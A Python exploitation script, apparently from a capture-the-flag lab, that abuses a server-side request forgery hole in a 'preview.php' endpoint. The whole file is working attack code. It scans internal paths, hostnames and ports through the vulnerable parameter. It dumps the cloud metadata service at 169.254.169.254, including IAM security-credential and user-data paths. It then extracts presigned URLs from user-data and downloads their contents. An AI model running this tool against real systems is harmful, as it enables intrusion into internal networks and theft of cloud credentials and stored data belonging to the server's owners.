#!/usr/bin/env python3
"""Small helper for probing the TryBookMe preview.php SSRF endpoint."""

from __future__ import annotations

import argparse
import re
import random
import string
import sys
import urllib.error
import urllib.parse
import urllib.request


DEFAULT_PATHS = [
    "/",
    "/server-status",
    "/server-status?auto",
    "/flag",
    "/debug",
    "/backup",
    "/backup.zip",
    "/index.php.bak",
    "/robots.txt",
    "/admin",
]

DEFAULT_HOSTS = [
    "cvssm1",
    "127.0.0.1",
    "localhost",
    "admin",
    "dev",
    "staging",
    "internal",
    "intranet",
]

DEFAULT_PORTS = [80, 8080, 8000, 5000, 3000, 8888, 9000]

IMDS_BASE = "http://169.254.169.254"
DEFAULT_IMDS_PATHS = [
    "/",
    "/latest/meta-data/",
    "/latest/meta-data/iam/",
    "/latest/meta-data/iam/security-credentials/",
    "/latest/user-data",
]


def fetch(url: str, timeout: float) -> tuple[int | None, str, str | None]:
    request = urllib.request.Request(url, headers={"User-Agent": "ssrf-preview-scout/1.0"})
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            body = response.read().decode("utf-8", errors="replace")
            return response.getcode(), body, None
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", errors="replace")
        return exc.code, body, None
    except Exception as exc:  # pragma: no cover - network failures vary
        return None, "", str(exc)


def build_preview_url(preview_base: str, target: str) -> str:
    encoded = urllib.parse.quote(target, safe="")
    separator = "&" if "?" in preview_base else "?"
    return f"{preview_base}{separator}url={encoded}"


def snippet(text: str, limit: int = 120) -> str:
    compact = " ".join(text.split())
    return compact[:limit]


def random_missing_path() -> str:
    suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"/__missing__{suffix}"


def load_wordlist(path: str) -> list[str]:
    values: list[str] = []
    with open(path, "r", encoding="utf-8", errors="replace") as handle:
        for raw_line in handle:
            candidate = raw_line.strip()
            if candidate and not candidate.startswith("#"):
                values.append(candidate)
    return values


def fetch_body(url: str, timeout: float) -> str:
    _, body, error = fetch(url, timeout)
    if error:
        raise RuntimeError(error)
    return body


def normalize_paths(items: list[str]) -> list[str]:
    normalized: list[str] = []
    for item in items:
        normalized.append(item if item.startswith("/") else f"/{item}")
    return normalized


def print_hit(label: str, status: int | None, body: str, baseline_status: int | None, baseline_len: int, show_all: bool) -> None:
    length = len(body)
    changed = length != baseline_len or status != baseline_status
    if show_all or changed:
        marker = "***" if changed else "   "
        print(f"{marker} {status!s:>3}  len={length:<5}  {label}")
        print(f"    {snippet(body)}")


def scan_paths(preview_base: str, target_base: str, paths: list[str], timeout: float, baseline_status: int | None, baseline_len: int, show_all: bool) -> None:
    for path in paths:
        target = f"{target_base}{path}"
        url = build_preview_url(preview_base, target)
        status, body, error = fetch(url, timeout)

        if error:
            print(f"ERR  {path}  {error}")
            continue

        print_hit(path, status, body, baseline_status, baseline_len, show_all)


def scan_hosts(preview_base: str, scheme: str, hosts: list[str], path: str, timeout: float, show_all: bool) -> None:
    for host in hosts:
        target_base = f"{scheme}://{host}".rstrip("/")
        baseline_target = f"{target_base}{random_missing_path()}"
        baseline_url = build_preview_url(preview_base, baseline_target)
        baseline_status, baseline_body, baseline_error = fetch(baseline_url, timeout)
        baseline_len = len(baseline_body)

        if baseline_error:
            print(f"ERR  {host}  baseline failed: {baseline_error}")
            continue

        target = f"{target_base}{path}"
        url = build_preview_url(preview_base, target)
        status, body, error = fetch(url, timeout)
        if error:
            print(f"ERR  {host}  {error}")
            continue

        print_hit(host, status, body, baseline_status, baseline_len, show_all)


def scan_ports(preview_base: str, scheme: str, host: str, ports: list[int], path: str, timeout: float, show_all: bool) -> None:
    for port in ports:
        target_base = f"{scheme}://{host}:{port}".rstrip("/")
        baseline_target = f"{target_base}{random_missing_path()}"
        baseline_url = build_preview_url(preview_base, baseline_target)
        baseline_status, baseline_body, baseline_error = fetch(baseline_url, timeout)
        baseline_len = len(baseline_body)

        if baseline_error:
            print(f"ERR  {port}  baseline failed: {baseline_error}")
            continue

        target = f"{target_base}{path}"
        url = build_preview_url(preview_base, target)
        status, body, error = fetch(url, timeout)
        if error:
            print(f"ERR  {port}  {error}")
            continue

        print_hit(str(port), status, body, baseline_status, baseline_len, show_all)


def dump_imds(preview_base: str, timeout: float, paths: list[str]) -> None:
    for path in paths:
        target = f"{IMDS_BASE}{path}"
        url = build_preview_url(preview_base, target)
        status, body, error = fetch(url, timeout)
        print(f"=== {path} ===")
        if error:
            print(f"ERR: {error}")
        else:
            print(f"STATUS: {status}")
            print(body)
        print()


def fetch_presigned_urls(preview_base: str, timeout: float) -> None:
    user_data_url = build_preview_url(preview_base, f"{IMDS_BASE}/latest/user-data")
    user_data = fetch_body(user_data_url, timeout)
    urls = re.findall(r"https://[^\s'\"]+", user_data)

    print(f"[+] Found {len(urls)} presigned URL(s) in user-data")
    for index, url in enumerate(urls, 1):
        print(f"=== PRESIGNED {index} ===")
        print(url)
        try:
            body = fetch_body(url, timeout)
            print(body)
        except Exception as exc:
            print(f"ERR: {exc}")
        print()


def main() -> int:
    parser = argparse.ArgumentParser(description="Probe the preview.php SSRF endpoint")
    parser.add_argument(
        "--preview-base",
        default="http://10.82.159.192/preview.php",
        help="Base URL of preview.php without the url= parameter",
    )
    parser.add_argument(
        "--target-base",
        default="http://cvssm1",
        help="Internal target base reached through SSRF",
    )
    parser.add_argument(
        "--scheme",
        default="http",
        help="Scheme to use for host or port scanning",
    )
    parser.add_argument(
        "--path",
        action="append",
        dest="paths",
        help="Path to test. Can be used multiple times.",
    )
    parser.add_argument(
        "--wordlist",
        help="Optional file with one path per line. Entries without leading / get one added.",
    )
    parser.add_argument(
        "--scan-hosts",
        action="store_true",
        help="Scan multiple hosts using a single path.",
    )
    parser.add_argument(
        "--host",
        action="append",
        dest="hosts",
        help="Host to test in host-scan mode. Can be used multiple times.",
    )
    parser.add_argument(
        "--host-wordlist",
        help="Optional file with one host per line for host-scan mode.",
    )
    parser.add_argument(
        "--scan-ports",
        action="store_true",
        help="Scan multiple ports on a single host using a single path.",
    )
    parser.add_argument(
        "--port",
        action="append",
        dest="ports",
        type=int,
        help="Port to test in port-scan mode. Can be used multiple times.",
    )
    parser.add_argument(
        "--host-base",
        default="127.0.0.1",
        help="Host to use in port-scan mode",
    )
    parser.add_argument(
        "--show-all",
        action="store_true",
        help="Show results even if they match the baseline size.",
    )
    parser.add_argument(
        "--dump-imds",
        action="store_true",
        help="Dump selected IMDS endpoints through SSRF.",
    )
    parser.add_argument(
        "--fetch-presigned",
        action="store_true",
        help="Extract presigned URLs from IMDS user-data and download their contents.",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=10.0,
        help="HTTP timeout in seconds",
    )
    args = parser.parse_args()

    paths: list[str] = []
    if args.paths:
        paths.extend(args.paths)

    if args.wordlist:
        paths.extend(load_wordlist(args.wordlist))

    if not paths:
        paths = list(DEFAULT_PATHS)
    paths = normalize_paths(paths)

    if args.scan_hosts and args.scan_ports:
        print("[!] Use either --scan-hosts or --scan-ports, not both.")
        return 1

    if args.dump_imds and args.fetch_presigned:
        print("[!] Use either --dump-imds or --fetch-presigned, not both.")
        return 1

    if args.dump_imds:
        imds_paths = paths if args.paths else list(DEFAULT_IMDS_PATHS)
        print(f"[+] Preview endpoint : {args.preview_base}")
        print(f"[+] IMDS base        : {IMDS_BASE}")
        print()
        dump_imds(args.preview_base, args.timeout, imds_paths)
        return 0

    if args.fetch_presigned:
        print(f"[+] Preview endpoint : {args.preview_base}")
        print("[+] Fetching presigned URLs from IMDS user-data")
        print()
        fetch_presigned_urls(args.preview_base, args.timeout)
        return 0

    if args.scan_hosts:
        hosts: list[str] = []
        if args.hosts:
            hosts.extend(args.hosts)
        if args.host_wordlist:
            hosts.extend(load_wordlist(args.host_wordlist))
        if not hosts:
            hosts = list(DEFAULT_HOSTS)

        path = paths[0]
        print(f"[+] Preview endpoint : {args.preview_base}")
        print(f"[+] Host scan path   : {path}")
        print(f"[+] Scheme          : {args.scheme}")
        print()
        scan_hosts(args.preview_base, args.scheme, hosts, path, args.timeout, args.show_all)
        return 0

    if args.scan_ports:
        ports = list(args.ports) if args.ports else list(DEFAULT_PORTS)
        path = paths[0]
        print(f"[+] Preview endpoint : {args.preview_base}")
        print(f"[+] Port scan host   : {args.host_base}")
        print(f"[+] Port scan path   : {path}")
        print(f"[+] Scheme          : {args.scheme}")
        print()
        scan_ports(args.preview_base, args.scheme, args.host_base, ports, path, args.timeout, args.show_all)
        return 0

    target_base = args.target_base.rstrip("/")

    baseline_target = f"{target_base}{random_missing_path()}"
    baseline_url = build_preview_url(args.preview_base, baseline_target)
    baseline_status, baseline_body, baseline_error = fetch(baseline_url, args.timeout)
    baseline_len = len(baseline_body)

    print(f"[+] Preview endpoint : {args.preview_base}")
    print(f"[+] SSRF target base : {target_base}")
    if baseline_error:
        print(f"[!] Baseline request failed: {baseline_error}")
    else:
        print(f"[+] Baseline status/len: {baseline_status}/{baseline_len}")
        print(f"[+] Baseline sample    : {snippet(baseline_body)}")
    print()

    scan_paths(args.preview_base, target_base, paths, args.timeout, baseline_status, baseline_len, args.show_all)

    return 0


if __name__ == "__main__":
    sys.exit(main())